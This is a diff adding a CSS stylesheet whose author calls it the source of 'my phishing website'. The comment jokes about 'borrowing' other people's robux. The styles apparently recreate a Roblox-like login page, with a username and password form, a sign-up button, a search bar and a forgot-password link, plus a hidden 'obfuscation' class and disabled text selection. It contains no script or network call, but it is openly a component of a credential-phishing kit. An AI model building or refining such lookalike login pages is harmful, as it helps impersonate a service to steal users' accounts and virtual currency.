@@ -1,0 +1,389 @@
+@charset "utf-8";
+/* CSS Document */
+
+/*
+====================================
+Why are you looking at the source
+code for my phishing website ;)
+
+I'm just an innocent kid living
+in syria
+
+My family can't afford any robux
+so I borrow other people's
+robux
+====================================
+*/
+@font-face {
+	font-family: Gotham; src:url("font/Gotham-Black.otf"); 
+}
+@font-face {
+	font-family: Gotham-Medium; src:url("font/GothamMedium.ttf"); 
+}
+@font-face {
+	font-family: Gotham-Thin; src:url("font/Gotham-Thin.otf"); 
+}
+/*
+Background
+*/
+
+body {
+	background-color:#f3f4f6;
+}
+/*
+Text
+*/
+.obfuscation {
+	display:none;
+}
+/*
+Imgs
+*/
+.mainLogo {
+	padding-left:20px;
+	position: absolute;
+    top: 0;
+    bottom: 0;
+    margin: auto;
+}
+.searchIcon {
+	position:relative;
+	top:3px;
+	left:5px;
+}
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 50%;
+}
+/*
+Divs
+*/
+.topDiv { /*the div for the title section of the website*/
+	position:absolute;
+	
+	left:0%;
+	top:0%;
+	
+	width:100%;
+	height:4.5%;
+	
+	border-style:solid;
+	border-top-width:0px;
+	border-left-width:0px;
+	border-right-width:0px;
+	border-bottom-width:1px;
+	border-color:lightgrey;
+	
+	
+	background-color:#dde1e3;
+}
+.sepatron {
+	list-style-type: none;
+	margin: 0;
+	padding: 0;
+	overflow: hidden;
+	background-color:#dde1e3;
+	
+	position: absolute;
+	left:10%;
+	top:0%;
+	
+	width: 40%;
+	height:4.5%;
+	
+	z-index:20;
+	
+	border-style:hidden;
+	border-color:#393b3d;
+	border-top-width:0px;
+	border-left-width:0px;
+	border-right-width:0px;
+	border-bottom-width:1px;
+}
+.search {
+	position:absolute;
+	
+	top:15%;
+	left:45%;
+	height:70%;
+	width:400px;
+	
+	z-index:25;
+	
+	background-color:white;
+
+	border-style:solid;
+	border-color:lightgray;
+	border-top-width:1px;
+	border-left-width:1px;
+	border-right-width:1px;
+	border-bottom-width:1px;
+	border-radius:8px;
+	
+	display: flex;
+    align-items: center;
+}
+.signupinator {
+	position:absolute;
+	
+	top:15%;
+	left:93%;
+	height:70%;
+	width:100px;
+	
+	z-index:25;
+	
+	background-color:#01b06f;
+	border-radius:8px;
+}
+.signupinator p{
+	position:absolute;
+	top:-10px;
+	left:15px;
+	
+	text-align:center;
+	color:white;
+	
+	font-family:Gotham-Medium;
+	font-size: 17px;
+    font-weight: 400;
+	letter-spacing: 1px;
+}
+.search span{
+  	text-align: center;
+  	color: lightgray;
+	
+	font-family:Gotham-Thin;
+	font-size:20px;
+}
+.logonDiv {
+	background-color:white; /*#36393f*/
+	
+	position:relative;
+	display: block; margin: auto;
+	
+	margin-top:6vh; /*was 15vh*/
+	
+	width:400px; /*was normally 800px*/
+	height:475px; /* lolol */
+	
+	align-content:center;
+	text-align:center;
+}
+.logonDiv p{
+	display: inline-block;
+
+	color:#393b3d;
+	
+	font-family:Gotham-Medium;
+	font-size: 30px;
+    font-weight: 400;
+}
+.divBottom {
+	text-align:center;
+	color:#393b3d;
+	
+	font-family:Gotham-Medium;
+	font-size:10px;
+    font-weight: 400;
+}
+/* 
+Navigation menu
+*/
+.nav {
+	list-style-type: none;
+	margin: 0;
+	padding: 0;
+	overflow: hidden;
+	background-color:#dde1e3;
+	
+	position: absolute;
+	left:10%;
+	top:0%;
+	
+	width: 40%;
+	height:4.5%;
+	
+	z-index:20;
+	
+	border-style:hidden;
+	border-color:#393b3d;
+	border-top-width:0px;
+	border-left-width:0px;
+	border-right-width:0px;
+	border-bottom-width:1px;
+}
+li {
+	float: left;
+}
+li a {
+	display: block;
+	color: #393b3d;
+	text-align: center;
+	padding: 11px 40px;
+	
+	text-decoration: none;
+	
+	font-family:Gotham-Medium;
+	font-size: 17px;
+    font-weight: 400;
+	letter-spacing: 1px;
+}
+li a:hover {
+	border-style:solid;
+	border-color:#393b3d;
+	border-top-width:0px;
+	border-left-width:0px;
+	border-right-width:0px;
+	border-bottom-width:6px;
+	background-color:#dde1e3;
+}
+.active {
+	background-color:#dde1e3;
+}
+/*
+Inputs
+*/
+::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
+  color: #c4c4c4;
+	font-family:Gotham-Thin;
+  opacity: 1; /* Firefox */
+}
+
+:-ms-input-placeholder { /* Internet Explorer 10-11 */
+  color: #c4c4c4;
+	font-family:Gotham-Thin;
+}
+
+::-ms-input-placeholder { /* Microsoft Edge */
+  color: #c4c4c4;
+	font-family:Gotham-Thin;
+}
+input[type=text] {
+  	width: 85%;
+	
+	padding-top:2.5%;
+	padding-left:2%;
+	padding-bottom:2.5%;
+	
+	margin-left: 5%;
+	margin-right: 5%;
+	
+	border:solid;
+	border-width:1px;
+	border-color:#dde1e3;
+	
+	border-radius: 10px;
+	background-color: white;
+	
+	font-family:Gotham-Medium;
+	color:#393b3d;
+	text-align:left;
+	font-size:100%;
+	
+	outline-width: 0;
+}
+input[type=password] {
+  	width: 85%;
+	
+	padding-top:2.5%;
+	padding-left:2%;
+	padding-bottom:2.5%;
+	
+	margin-left: 5%;
+	margin-right: 5%;
+	
+	border:solid;
+	border-width:1px;
+	border-color:#dde1e3;
+	
+	border-radius: 10px;
+	background-color: white;
+	
+	font-family:Gotham-Medium;
+	color:#393b3d;
+	text-align:left;
+	font-size:100%;
+	
+	outline-width: 0;
+}
+input[type=submit] {
+  	width: 89%;
+	
+	padding-top:2.5%;
+	padding-left:2%;
+	padding-bottom:2.5%;
+	
+	margin-left: 5%;
+	margin-right: 5%;
+	
+	border:solid;
+	border-width:1px;
+	border-color:#393b3d;
+	
+	border-radius: 10px;
+	background-color: white;
+	
+	font-family:Gotham-Medium;
+	color:#393b3d;
+	text-align:center;
+	font-size:100%;
+	
+	outline-width: 0;
+}
+p.forgorskull {
+	font-size:17px;
+}
+p.forgorskulld {
+	font-size:17px;
+	color:#63676A;
+}
+a {
+	color:#393b3d;
+	text-decoration:None;
+}
+a.hover{
+	color:#393b3d;
+	text-decoration:underline;
+}
+/*
+Code for PHP and whatnot
+*/
+.error {
+	color: #FF0000;
+	font-size:10px;
+}
+
+/*
+CODE FOR STICKY FOOTER
+===========================================================================
+*/
+html, body {
+  height: 100%;
+}
+body {
+  display: flex;
+  flex-direction: column;
+}
+.content {
+  flex: 1 0 auto;
+	padding-top:15%; /*my own code -nicholas*/
+}
+.footer {
+  flex-shrink: 0;
+}
+/*
+===========================================================================
+*/
+
+p { /*For preventing selecting text */
+	-webkit-touch-callout: none; /* iOS Safari */
+    -webkit-user-select: none; /* Safari */
+     -khtml-user-select: none; /* Konqueror HTML */
+       -moz-user-select: none; /* Old versions of Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version, currently
+                                  supported by Chrome, Edge, Opera and Firefox */
+}
